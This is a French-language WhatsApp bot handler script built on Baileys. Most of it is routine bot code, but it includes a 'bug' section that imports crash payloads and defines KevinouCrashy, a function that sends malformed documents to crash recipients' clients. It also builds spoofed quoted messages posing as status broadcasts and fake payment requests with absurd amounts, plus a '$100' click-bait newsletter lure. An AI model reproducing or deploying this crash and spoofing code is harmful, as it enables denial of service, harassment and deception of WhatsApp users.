//base by Kenvofc
//re-upload? recode? copy code? give credit ya :)
//YouTube: @Kenvofc
//Instagram: kenv8070
//Telegram: t.me/Kev
//GitHub: @kenvofc
//WhatsApp: +237656774511
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@Kenvofc
require('./bibliotheque/liste_menu')
const {
	downloadContentFromMessage,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    InteractiveMessage,
    getContentType
} = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const { color } = require('./bibliotheque/coleur')
const chalk = require('chalk')
const moment = require('moment-timezone')
const cron = require('node-cron')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const yts = require('yt-search')
const gis = require('g-i-s')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const fg = require('api-dylux')
const googleTTS = require('google-tts-api')
const jsobfus = require('javascript-obfuscator')
const {translate} = require('@vitalets/google-translate-api')
const { download } = require('aptoide-scraper');
const scp2 = require('./bibliotheque/scraper2') 
const { xvideosSearch, xvideosdl, xnxxdl, xnxxSearch} = require('./bibliotheque/scraper3.js')
const pkg = require('imgur')
const { ImgurClient } = pkg
const uploadImage = require('./bibliotheque/uploadImage')
const client = new ImgurClient({ clientId: "a0113354926015a" })
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./bibliotheque/uploader')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./bibliotheque/convertir')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer,
    buffergif,
    GIFBufferToVideoBuffer,
    totalcase
} = require('./bibliotheque/mes_fonctions')
const { kev_antispam } = require('./bibliotheque/antispam')
//fonctions du boss et du proprio
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./bibliotheque/boss')
//stockage 
const { 
addResponList, 
delResponList, 
isAlreadyResponList, 
isAlreadyResponListGroup, 
sendResponList, 
updateResponList, 
getDataResponList 
} = require('./bibliotheque/liste')

//cooldone
let lastUsed = 0;

//donnee
let ntnsfw = JSON.parse(fs.readFileSync('./recherche/donnees/fonction/-18.json'))
let bad = JSON.parse(fs.readFileSync('./recherche/donnees/fonction/gros_mot.json'))
let premium = JSON.parse(fs.readFileSync('./recherche/donnees/role/boss.json'))
const owner = JSON.parse(fs.readFileSync('./recherche/donnees/role/proprio.json'))
//media
const VoiceNoteKev = JSON.parse(fs.readFileSync('./KenvFile/database/kenvvn.json'))
const StickerKev = JSON.parse(fs.readFileSync('./KenvFile/database/kenvsticker.json'))
const ImageKev = JSON.parse(fs.readFileSync('./KenvFile/database/kenvimage.json'))
const VideoKev = JSON.parse(fs.readFileSync('./KenvFile/database/kenvvideo.json'))
const DocKev = JSON.parse(fs.readFileSync('./KenvFile/database/doc.json'))
const ZipKev = JSON.parse(fs.readFileSync('./KenvFile/database/zip.json'))
const ApkKev = JSON.parse(fs.readFileSync('./KenvFile/database/apk.json'))

// database des bug
const { pluton1 } = require('./recherche/donnees/fonction/Kboom/pluton1')
const { satan2 } = require('./recherche/donnees/fonction/Kboom/satan2')
const { poseidon3 } = require('./recherche/donnees/fonction/Kboom/poseidon3')
const { saturne4 } = require('./recherche/donnees/fonction/Kboom/saturne4')
const { jupiter5 } = require('./recherche/donnees/fonction/Kboom/jupiter5')
const { kenv6 } = require('./recherche/donnees/fonction/Kboom/kenv6')
const wkwk = fs.readFileSync('./recherche/donnees/fonction/Kboom/k.mp3')
const ksteek = fs.readFileSync('./recherche/donnees/fonction/Kboom/k.webp')

//contenu de la base de donnee
const db_respon_list = JSON.parse(fs.readFileSync('./recherche/store/liste.json'))

const kevverifieduser = JSON.parse(fs.readFileSync('./recherche/data/role/utilisateur.json'))

global.db.data = JSON.parse(fs.readFileSync('./recherche/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

let vote = db.data.others.vote = []
let kuismath = db.data.game.math = []

//temps
const ktime = moment.tz('Africa/Abidjan').format('HH:mm:ss')
const kdate = moment.tz('Africa/Abidjan').format('DD/MM/YYYY')
const time2 = moment().tz('Africa/Abidjan').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var kevinoutimewisher = 'Douce Nuit 🌌'
 }
 if(time2 < "19:00:00"){
var kevinoutimewisher = 'Bonsoir 🌃'
 }
 if(time2 < "18:00:00"){
var kevinoutimewisher = 'Bonsoir 🌃'
 }
 if(time2 < "15:00:00"){
var kevinoutimewisher = 'Bon Aprem 🌅'
 }
 if(time2 < "11:00:00"){
var kevinoutimewisher = 'Bonjour 🌄'
 }
 if(time2 < "05:00:00"){
var kevinoutimewisher = 'Bonjour 🌄'
 } 
//fonction
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
//module
module.exports = Kev = async (Kev, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
       var body = (
  m.mtype === 'conversation' ? m.message.conversation :
  m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
  m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
  m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
  m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === 'InteractiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id :
  m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === 'messageContextInfo' ?
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
    m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
    m.text :
  ''
);
        var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        var prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : kprefix
        const isCmd = body.startsWith(prefix)
        //prefix2 et command2 pour les telechargements auto
        const prefix2 = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
        const isCmd2 = body.startsWith(prefix2)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await Kev.decodeJid(Kev.user.id)
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const kevinoumisc = (m.quoted || m)
        const quoted = (kevinoumisc.mtype == 'buttonsMessage') ? kevinoumisc[Object.keys(kevinoumisc)[1]] : (kevinoumisc.mtype == 'templateMessage') ? kevinoumisc.hydratedTemplate[Object.keys(kevinoumisc.hydratedTemplate)[1]] : (kevinoumisc.mtype == 'product') ? kevinoumisc[Object.keys(kevinoumisc)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
       //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : kprefix
        const kevinoubody = body.startsWith(pric)
        const isCommand = kevinoubody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
       //groupe
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await Kev.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        //anti media
        const isKevMedia = m.mtype
        //m statut de l.utilisateur
        const isUser = kevverifieduser.includes(sender)
        const KevTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium= KevTheCreator || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(Kev, m, premium)
        
        //theme de sticker de reponse
        const KevStickWait = () => {
        let KevStikRep = fs.readFileSync('./KenvFile/theme/sticker_reponse/attente.webp')
        Kev.sendMessage(from, { sticker: KevStikRep }, { quoted: m })
        }
        const KevStickAdmin = () => {
        let KevStikRep = fs.readFileSync('./KenvFile/theme/sticker_reponse/admin.webp')
        Kev.sendMessage(from, { sticker: KevStikRep }, { quoted: m })
        }
        const KevStickBotAdmin = () => {
        let KevStikRep = fs.readFileSync('./KenvFile/theme/sticker_reponse/botadmin.webp')
        Kev.sendMessage(from, { sticker: KevStikRep }, { quoted: m })
        }
        const KevStickOwner = () => {
        let KevStikRep = fs.readFileSync('./KenvFile/theme/sticker_reponse/proprio.webp')
        Kev.sendMessage(from, { sticker: KevStikRep }, { quoted: m })
        }
        const KevStickGroup = () => {
        let KevStikRep = fs.readFileSync('./KenvFile/theme/sticker_reponse/groupe.webp')
        Kev.sendMessage(from, { sticker: KevStikRep }, { quoted: m })
        }
        const KevStickPrivate = () => {
        let KevStikRep = fs.readFileSync('./KenvFile/theme/sticker_reponse/dm.webp')
        Kev.sendMessage(from, { sticker: KevStikRep }, { quoted: m })
        }
 
 // fonctions du bug
const kbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": '{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}'
}
]
}
}
}
};
// fonctions du bug
const subscribe_kenvofc = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: 'Kev ur father'
}}
}
async function KevinouCrashy(kenvofc,chat) {
Kev.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: 'image/null',
fileName: '${kenvofc}.${pluton1}' ,
caption: '${kenvofc + pluton1}',
}, {quoted: subscribe_kenvofc })
}
//fin de la fonction bug

        //boss
        async function replyprem(teks) {
    replygckev('Cette commande est destinee aux boss, veuillez contacter le proprio pour en devenir un.')
}
        //script replier
        async function sendKevMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(
generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await Kev.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
        //reponse
        async function replygckev(teks) {
            if (typereply === 'c1') {
                m.reply(teks)
            } else if (typereply === 'c2') {
                Kev.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                            sourceUrl: wagc
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                });
            } else if (typereply === 'c3') {
               Kev.sendMessage(m.chat, {
                  text: teks,
                  contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: ownername,
                        thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        sourceUrl: websitex,
                        mediaType: 1,
                        renderLargerThumbnail: true
                     }
                  }
               }, { quoted: m })
            } else if (typereply === 'c4') {
                replygckev2(teks)
            }
        }
        
        //fausse reponse avec lien de la chaine associee 
async function replygckev2(txt) {
const kevnewrep = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "Veuillez cliquer pour avoir $100",
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: botname,
body: ownername,
thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
sourceUrl: websitex
},
},
text: txt,
}
return Kev.sendMessage(from, kevnewrep, {
quoted: m,
})
}
            
        let fstatus = { 
            key: { 
               fromMe: false, 
               participant: '0@s.whatsapp.net',  
               ...(m.chat ? {  remoteJid: "status@broadcast"  } : {}) 
            }, 
               message: {  
                  "imageMessage": { 
                     "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", 
                     "mimetype": "image/jpeg", 
                     "caption": botname,
                     "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", 
                     "fileLength": "28777",
                     "height": 1080,
                     "width": 1079,
                     "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                     "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                     "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                     "mediaKeyTimestamp": "1610993486",
                     "jpegThumbnail": await reSize(thumb, 100, 100),
                     "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                  }
               }
            }
            
            //Fake quoted 
        const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id:global.botname, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.botname}}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: 'status@broadcast' } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": '${pushname}', 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': '${pushname}', 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: 'status@broadcast' } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: 'status@broadcast' } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': 'BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=237656774511:237656774511\nitem1.X-ABLabel:Mobile\nEND:VCARD', 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./KenvFile/theme/sylvers.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
	    const frpayment = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: '${ownername}',
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: '${botname}'
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "USD"
			}
		}
	}
}
            
            const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
        
        //base de donnees
        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? 1000 : 100
            let user = global.db.data.users[sender]
            if (typeof user !== 'object') global.db.data.users[sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('badword' in user)) user.badword = 0
                if (!('title' in user)) user.title = ''
                if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex') 
                if (!('afkReason' in user)) user.afkReason = ''
                if (!('nick' in user)) user.nick = Kev.getName(sender)
                if (!isPremium) user.premium = false
                if (!('totalLimit' in user)) user.totalLimit = 0
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[sender] = {
               serialNumber: randomBytes(16).toString('hex'),
               title: '${isPremium ? 'Premium' : 'User'}',
               afkTime: -1,
               badword: 0,
               afkReason: '',
               nick: Kev.getName(sender),
               premium: '${isPremium ? 'true' : 'false'}',
               limit: limitUser,
               totalLimit: 0
            }
            
               let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                  if (!('badword' in chats)) chats.badword = false
                  if (!('antiforeignnum' in chats)) chats.antiforeignnum = false
                  if (!('antibot' in chats)) chats.antibot = false
                  if (!('antiviewonce' in chats)) chats.antiviewonce = false
                  if (!('antispam' in chats)) chats.antispam = false
                  if (!('antimedia' in chats)) chats.media = false
                  if (!('antivirtex' in chats)) chats.antivirtex = false
                  if (!('antiimage' in chats)) chats.antiimage = false
                  if (!('antivideo' in chats)) chats.video = false
                  if (!('antiaudio' in chats)) chats.antiaudio = false
                  if (!('antipoll' in chats)) chats.antipoll = false
                  if (!('antisticker' in chats)) chats.antisticker = false
                  if (!('anticontact' in chats)) chats.anticontact = false
                  if (!('antilocation' in chats)) chats.antilocation = false
                  if (!('antidocument' in chats)) chats.antidocument = false
                  if (!('antilink' in chats)) chats.antilink = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
                  if (!('antipromotion' in chats)) chats.antipromotion = false
               } else global.db.data.chats[from] = {
                  badword: false,
                  antiforeignnum: false,
                  antibot: false,
                  antiviewonce: false,
                  antispam: false,
                  antivirtex: false,
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antilink: false,
                  antipromotion: false,
                  antilinkgc: false
               }
            
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
               if (!('totalhit' in setting)) setting.totalhit = 0
               if (!('totalError' in setting)) setting.totalError = 0
               if (!('online' in setting)) setting.online = false 
               if (!('autosticker' in setting)) setting.autosticker = false 
               if (!('autodownload' in setting)) setting.autodownload = false 
               if (!('autobio' in setting)) setting.autobio = false 
               if (!('autoread' in setting)) setting.autoread = false
               if (!('autorecordtype' in setting)) setting.autorecordtype = false
               if (!('autorecord' in setting)) setting.autorecord = false
               if (!('autotype' in setting)) setting.autotype = false
               if (!('autoblocknum' in setting)) setting.autoblocknum = false
               if (!('onlyindia' in setting)) setting.onlyindia = false
               if (!('onlyindo' in setting)) setting.onlyindo = false
               if (!('onlygrub' in setting)) setting.onlygrub = false
               if (!('onlypc' in setting)) setting.onlypc = false
               if (!('watermark' in setting)) setting.watermark = { packname , author }
               if (!('about' in setting)) setting.about = { bot: { nick: Kev.getName(botNumber), alias: botname}, owner: { nick: Kev.getName(global.ownernumber + '@s.whatsapp.net'), alias: global.ownernumber}}
            } else global.db.data.settings[botNumber] = {
               totalhit: 0,
               totalError: 0,
               online: false,
               autosticker: false,
               autodownload: false,
               autobio: false,
               autoread: false,
               autoblocknum: false,
               onlycmr: false,
               onlybnin: false,
               onlygrub: false,
               onlypc: false,
               autorecordtype: false,
               autorecord: false,
               autotype: false,
               watermark: {
                  packname: global.packname, 
                  author: global.author
               },
               about: {
                  bot: {
                     nick: Kev.getName(botNumber), 
                     alias: botname
                  },
                  owner: {
                     nick: Kev.getName(global.ownernumber + '@s.whatsapp.net'), 
                     alias: global.ownernumber
                  }
               }
            }
            
        } catch (err) {
            console.log(err)
        }
       
        //photo uploader
        async function uploadtoimgur(imagepath) {
  try {
    const response = await client.upload({
      image: fs.createReadStream(imagepath),
      type: 'stream',
    })

    let url = response.data.link
    console.log(url)
    return url
  } catch (error) {
    console.error('Error uploading image to Imgur:', error)
    throw error
  }
}        
        async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

//reaction auto
const kevreact = async () => {
  const emojis = ["🌷", "🤙", "😂", "🤣", "😭", "🫂", "💔", "😡"]; 
  for (const emoji of emojis) {
    await sleep(80);
    Kev.sendMessage(m.chat, { react: { text: emoji, key: m.key }});
  }
  await sleep(50);
  Kev.sendMessage(m.chat, { react: { text: randomemoji, key: m.key }});
}

//chargement 
async function loading () {
var kevlod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
]
let { key } = await Kev.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < kevlod.length; i++) {
await Kev.sendMessage(from, {text: kevlod[i], edit: key })
}
} 

const kevimun = (texto) => {
Kev.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return m.reply("Erro..")
})
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: '${ownername}',
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

// fonction sticker meta 
async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
  const {
      default: {
            Image
                }
                  } = await import('node-webpmux')
                    const img = new Image()
                      const json = {
                          'sticker-pack-id': 'Natsxe',
                              'sticker-pack-name': packname,
                                  'sticker-pack-publisher': author,
                                      'emojis': categories,
                                          'is-avatar-sticker': 1,
                                              ...extra
                                                }
                                                  let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
                                                    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
                                                      let exif = Buffer.concat([exifAttr, jsonBuffer])
                                                        exif.writeUIntLE(jsonBuffer.length, 14, 4)
                                                          await img.load(buffer)
                                                            img.exif = exif
                                                              return await img.save(null)
                                                              }
